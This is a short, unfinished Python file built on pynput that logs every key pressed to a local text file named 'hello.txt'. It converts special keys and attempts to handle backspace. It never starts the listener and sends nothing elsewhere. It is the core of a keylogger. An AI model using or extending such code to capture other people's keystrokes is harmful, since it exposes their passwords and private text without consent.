from pynput import keyboard


class Listener:
    word = []

    def on_press(self, key):
       Listener.word.append(key)
       with open('hello.txt', 'w') as f:
          for c in Listener.word:
            try:
                f.write(c.char)
            except AttributeError:
                if c == keyboard.Key.space:
                    f.write(" ")
                elif c == keyboard.Key.enter:
                    f.write("\n")
                elif c == keyboard.Key.backspace:
                    char_to_delete = f.seek(f.tell() - 1)
                    f.truncate()
                else:
                    f.write(" " + str(c) + " ")
            
           
